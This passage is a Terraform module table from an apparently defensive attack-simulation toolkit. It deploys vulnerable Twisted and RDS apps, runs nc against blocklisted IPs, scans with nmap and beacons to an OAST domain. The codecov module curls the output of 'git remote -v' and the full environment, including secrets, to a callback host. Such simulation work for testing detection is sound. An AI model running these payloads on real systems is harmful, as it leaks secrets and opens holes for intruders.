vuln\_python3\_twisted\_app\_target \-X colon "logfile flush 0^M"<br/>            sleep 30<br/>            log "check app url\.\.\."<br/>            while \! curl \-sv http://localhost:$\{var\.inputs\["listen\_port"\]\} \| tee \-a $LOGFILE; do<br/>                log "failed to connect to app url http://localhost:$\{var\.inputs\["listen\_port"\]\} \- retrying"<br/>                sleep 60<br/>            done<br/>            log 'waiting 30 minutes\.\.\.';<br/>            sleep 1800<br/>            if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>                log "payload update detected \- exiting loop and forcing payload download"<br/>                rm \-f /tmp/payload\_$SCRIPTNAME<br/>                break<br/>            else<br/>                log "restarting loop\.\.\."<br/>            fi<br/>        done<br/>    else<br/>        log "python twisted vulnerability required the following package installed:"<br/>        log "python3\-twisted/focal\-updates,focal\-security,now 18\.9\.0\-11ubuntu0\.20\.04\.1"<br/>    fi<br/>    log "done"<br/>    EOT<br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = "curl python3\-pip"<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  ""<br/>        yum\_packages = "curl python3\-pip"<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    app\_py = templatefile\(<br/>                "$\{path\.module\}/resources/app\.py",<br/>                \{<br/>                    listen\_port = var\.inputs\["listen\_port"\]<br/>                \}\)<br/>    requirements = templatefile\(<br/>                "$\{path\.module\}/resources/requirements\.txt",<br/>                \{<br/>                \}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| attacker-vulnerable-rds-app                                                | ./modules/ssm/deploy-rds-app                                   | ssm_deploy_rds_app                         | context.aws.ssm.vulnerable.rds_app                                        | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "vulnerable": {<br/>                    "rds_app": {<br/>                        "enabled": false,<br/>                        "listen_port": 8091<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/deploy-rds-app                                   | <pre>locals \{<br/>    listen\_port=var\.inputs\["listen\_port"\]<br/>    app\_dirname = "vuln\_rdsapp\_target"<br/>    app\_path = "/$\{local\.app\_dirname\}/app\.py"<br/>    payload = <<\-EOT<br/>    screen \-S vuln\_rdsapp\_target \-X quit<br/>    screen \-wipe<br/>    truncate \-s 0 /tmp/vuln\_rdsapp\_target\.log<br/>    log "removing previous app directory"<br/>    rm \-rf /$\{local\.app\_dirname\}<br/>    log "building app directory"<br/>    mkdir \-p /$\{local\.app\_dirname\}/templates<br/>    cd /$\{local\.app\_dirname\}<br/>    <br/>    echo $\{base64gzip\(local\.app\)\} \| base64 \-d \| gunzip > app\.py<br/>    echo $\{base64gzip\(local\.requirements\)\} \| base64 \-d \| gunzip > requirements\.txt<br/>    echo $\{base64gzip\(local\.test\)\} \| base64 \-d \| gunzip > test\.py<br/>    curl \-LOJ https://s3\.amazonaws\.com/rds\-downloads/rds\-combined\-ca\-bundle\.pem<br/>    echo $\{base64gzip\(local\.database\)\} \| base64 \-d \| gunzip > bootstrap\.sql<br/>    echo $\{base64gzip\(local\.entrypoint\)\} \| base64 \-d \| gunzip > entrypoint\.sh<br/>    echo $\{base64gzip\(local\.index\)\} \| base64 \-d \| gunzip > templates/index\.html<br/>    echo $\{base64gzip\(local\.cast\)\} \| base64 \-d \| gunzip > templates/cast\.html<br/><br/>    log "updating entrypoing permissions"<br/>    chmod 755 entrypoint\.sh<br/><br/>    log "installing requirements\.\.\."<br/>    python3 \-m pip install \-r requirements\.txt >> $LOGFILE 2>&1<br/>    log "requirements installed"<br/>    <br/>    log "running mysql boostrap\.\.\."<br/>    mysql \-\-ssl\-ca=rds\-combined\-ca\-bundle\.pem \-\-ssl\-mode=REQUIRED \-h $\{split\(":", var\.inputs\["db\_host"\]\)\[0\]\} \-u$\{var\.inputs\["db\_user"\]\} \-p$\{var\.inputs\["db\_password"\]\} < bootstrap\.sql<br/>    log "mysql boostrap complete"<br/><br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        log "starting app"<br/>        screen \-S $\{local\.app\_dirname\} \-X quit<br/>        screen \-wipe<br/>        screen \-d \-L \-Logfile /tmp/$\{local\.app\_dirname\}\.log \-S $\{local\.app\_dirname\} \-m /$\{local\.app\_dirname\}/entrypoint\.sh<br/>        screen \-S $\{local\.app\_dirname\} \-X colon "logfile flush 0^M"<br/>        sleep 30<br/>        log "check app url\.\.\."<br/>        while \! curl \-sv http://localhost:$\{var\.inputs\["listen\_port"\]\}/cast \| tee \-a $LOGFILE; do<br/>            log "failed to connect to app url http://localhost:$\{var\.inputs\["listen\_port"\]\}/cast \- retrying"<br/>            sleep 60<br/>        done<br/>        log 'waiting 30 minutes\.\.\.';<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>        fi<br/>    done<br/>    EOT<br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = "curl python3\-pip mysql\-client\-core\-8\.0"<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  ""<br/>        yum\_packages = "curl python3\-pip mysql\-shell"<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    app = templatefile\(<br/>                            "$\{path\.module\}/resources/app\.py\.tpl",<br/>                            \{<br/>                                region = var\.inputs\["db\_region"\]<br/>                            \}<br/>                        \)<br/>    test = templatefile\(<br/>                          "$\{path\.module\}/resources/test\.py\.tpl",<br/>                            \{<br/>                                region = var\.inputs\["db\_region"\]<br/>                            \}<br/>                        \)<br/>    requirements = templatefile\(<br/>                          "$\{path\.module\}/resources/requirements\.txt",<br/>                          \{\}<br/>                        \)<br/>    database = templatefile\(<br/>                          "$\{path\.module\}/resources/bootstrap\.sql\.tpl",<br/>                            \{<br/>                                db\_user = var\.inputs\["db\_user"\]<br/>                                db\_name = var\.inputs\["db\_name"\]<br/>                            \}<br/>                        \)<br/>    entrypoint = templatefile\(<br/>                            "$\{path\.module\}/resources/entrypoint\.sh\.tpl",<br/>                            \{<br/>                                 listen\_port = var\.inputs\["listen\_port"\]<br/>                                 app\_path = local\.app\_path<br/>                            \}<br/>                        \)<br/>    index = file\(<br/>                            "$\{path\.module\}/resources/index\.html"<br/>                        \)<br/>    cast = file\(<br/>                            "$\{path\.module\}/resources/cast\.html"<br/>                        \)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| target-ssm-connect-badip                                                   | ./modules/ssm/connect-badip                                    | ssm_connect_bad_ip                         | context.aws.ssm.target.connect.badip                                      | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "connect": {<br/>                        "badip": {<br/>                            "enabled": false,<br/>                            "iplist_url": "https://raw.githubusercontent.com/firehol/blocklist-ipsets/master/firehol_level2.netset",<br/>                            "retry_delay_secs": 1800<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-badip                                    | <pre>locals \{<br/>    iplist\_url = var\.inputs\["iplist\_url"\]<br/>    payload = <<\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        echo $\{base64gzip\(local\.iplist\_base64\)\} \| base64 \-d \| gunzip > threatdb\.csv<br/>        log "enumerating bad ips in threatdb\.csv"<br/>        for i in $\(grep 'IPV4,' threatdb\.csv \| awk \-F',' '\{ print $2 \}' \); do log "connecting to: $i"; nc \-vv \-w 5 $i 80 >> $LOGFILE 2>&1; sleep 1; done;<br/>        log 'waiting $\{var\.inputs\["retry\_delay\_secs"\]\} seconds\.\.\.';<br/>        sleep $\{var\.inputs\["retry\_delay\_secs"\]\}<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>        fi<br/>    done<br/>    EOT<br/><br/>    iplist\_base64 = file\("$\{path\.module\}/resources/threatdb\.csv"\)<br/><br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = ""<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  ""<br/>        yum\_packages = ""<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| target-ssm-connect-codecov                                                 | ./modules/ssm/connect-codecov                                  | ssm_connect_codecov                        | context.aws.ssm.target.connect.codecov                                    | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "connect": {<br/>                        "codecov": {<br/>                            "enabled": false,<br/>                            "env_secrets": [<br/>                                "SECRET=supersecret123"<br/>                            ],<br/>                            "git_origin": "git@git.localhost:repo/repo.git",<br/>                            "host_ip": null,<br/>                            "host_port": 8080,<br/>                            "use_ssl": false<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-codecov                                  | <pre>locals \{<br/>    host\_ip = var\.inputs\["host\_ip"\]<br/>    host\_port = var\.inputs\["host\_port"\]<br/>    git\_origin=var\.inputs\["git\_origin"\]<br/>    env\_secrets=join\(" ", var\.inputs\["env\_secrets"\]\)<br/>    callback\_url = var\.inputs\["use\_ssl"\] == true ? "https://$\{local\.host\_ip\}:$\{local\.host\_port\}" : "http://$\{local\.host\_ip\}:$\{local\.host\_port\}"<br/>    command\_payload=<<\-EOT<br/>    LOGFILE=/tmp/$\{basename\(path\.module\)\}\_command\.log<br/>    function log \{<br/>        echo \`date \-u \+"%Y\-%m\-%dT%H:%M:%SZ"\`" $1"<br/>        echo \`date \-u \+"%Y\-%m\-%dT%H:%M:%SZ"\`" $1" >> $LOGFILE<br/>    \}<br/>    rm \-rf /tmp/repo<br/>    mkdir \-p /tmp/repo<br/>    cd /tmp/repo<br/>    git init<br/>    git remote add origin $\{local\.git\_origin\}<br/>    log "running curl post: curl \-sm 0\.5 \-d \\"$\(git remote \-v\)<<<<<< ENV $\(env\)\\" $\{local\.callback\_url\}/upload/v2"<br/>    curl \-sm 0\.5 \-d "$\(git remote \-v\)<<<<<< ENV $\(env\)" $\{local\.callback\_url\}/upload/v2 >> $LOGFILE 2>&1<br/>    sleep 30<br/>    exit<br/>    EOT<br/>    base64\_command\_payload=local\.command\_payload<br/>    payload = <<\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        screen \-S codecov \-X quit<br/>        screen \-wipe<br/>        truncate \-s 0 /tmp/codecov\.log<br/>        log "checking for git\.\.\."<br/>        while \! command \-v git; do<br/>            log "git not found \- waiting"<br/>            sleep 10<br/>        done<br/>        log "git: $\(command \-v  git\)"<br/>        screen \-d \-Logfile /tmp/codecov\.log \-S codecov \-m env \-i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin $\{local\.env\_secrets\} /bin/bash \-\-noprofile \-\-norc<br/>        screen \-S codecov \-X colon "logfile flush 0^M"<br/>        log 'sending screen command: $\{local\.command\_payload\}';<br/>        screen \-S codecov \-p 0 \-X stuff "echo '$\{base64gzip\(local\.base64\_command\_payload\)\}' \| base64 \-d \| gunzip \| /bin/bash \-^M"<br/>        log 'waiting 30 minutes\.\.\.';<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = "git"<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  ""<br/>        yum\_packages = "git"<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| target-ssm-connect-nmap-port-scan                                          | ./modules/ssm/connect-nmap-port-scan                           | ssm_connect_enumerate_host                 | context.aws.ssm.target.connect.nmap_port_scan                             | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "connect": {<br/>                        "nmap_port_scan": {<br/>                            "enabled": false,<br/>                            "nmap_scan_host": "portquiz.net",<br/>                            "nmap_scan_ports": [<br/>                                80,<br/>                                443,<br/>                                23,<br/>                                22,<br/>                                8080,<br/>                                3389,<br/>                                27017,<br/>                                3306,<br/>                                6379,<br/>                                5432,<br/>                                389,<br/>                                636,<br/>                                1389,<br/>                                1636<br/>                            ]<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-nmap-port-scan                           | <pre>locals \{<br/>    nmap\_download = "https://github\.com/andrew\-d/static\-binaries/blob/master/binaries/linux/x86\_64/nmap?raw=true"<br/>    nmap\_path = "/tmp/nmap"<br/>    nmap\_ports = join\(",",var\.inputs\["nmap\_scan\_ports"\]\)<br/>    nmap\_scan\_host = var\.inputs\["nmap\_scan\_host"\]<br/>    payload = <<\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        log "scan target: $\{local\.nmap\_scan\_host\} $\{local\.nmap\_ports\}"<br/>        log "checking for nmap"<br/>        if \! command \-v nmap; then<br/>            log "nmap not found"<br/>            log "downloading: $\{local\.nmap\_download\}"<br/>            if \[ \-f $\{local\.nmap\_path\} \]; then<br/>                curl \-L \-o $\{local\.nmap\_path\} $\{local\.nmap\_download\} >> $LOGFILE 2>&1<br/>                chmod 755 $\{local\.nmap\_path\} >> $LOGFILE 2>&1<br/>            fi<br/>            log "using nmap: $\{local\.nmap\_path\}"<br/>            $\{local\.nmap\_path\} \-sT \-p $\{local\.nmap\_ports\} $\{local\.nmap\_scan\_host\} >> $LOGFILE 2>&1<br/>        else<br/>            nmap \-sS \-p $\{local\.nmap\_ports\} $\{local\.nmap\_scan\_host\} >> $LOGFILE 2>&1<br/>        fi<br/>        log 'waiting 30 minutes\.\.\.';<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = ""<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  ""<br/>        yum\_packages = ""<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| target-ssm-connect-oast-host                                               | ./modules/ssm/connect-oast-host                                | ssm_connect_oast_host                      | context.aws.ssm.target.connect.oast                                       | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "connect": {<br/>                        "oast": {<br/>                            "enabled": false,<br/>                            "retry_delay_secs": 1800<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-oast-host                                | <pre>locals \{<br/>    oast\_domain = "burpcollaborator\.net"<br/>    payload = <<\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk '\{ print $1 \}'\)<br/>    while true; do<br/>        OAST\_URL="https://$\(cat /dev/urandom \| tr \-dc '\[:lower:\]' \| fold \-w $$\{1:\-16\} \| head \-n 1\)\.$\{local\.oast\_domain\}"<br/>        log "http request: $OAST\_URL"<br/>        curl \-s "$OAST\_URL" >> $LOGFILE 2>&1<br/>        log 'waiting $\{var\.inputs\["retry\_delay\_secs"\]\} seconds\.\.\.';<br/>        sleep $\{var\.inputs\["retry\_delay\_secs"\]\}<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log "payload update detected \- exiting loop and forcing payload download"<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log "restarting loop\.\.\."<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64\_payload = templatefile\("$\{path\.module\}/\.\./\.\./delayed\_start\.sh", \{ config = \{<br/>        script\_name = var\.inputs\["tag"\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = ""<br/>        apt\_packages = ""<br/>        apt\_post\_tasks = ""<br/>        yum\_pre\_tasks =  ""<br/>        yum\_packages = ""<br/>        yum\_post\_tasks = ""<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
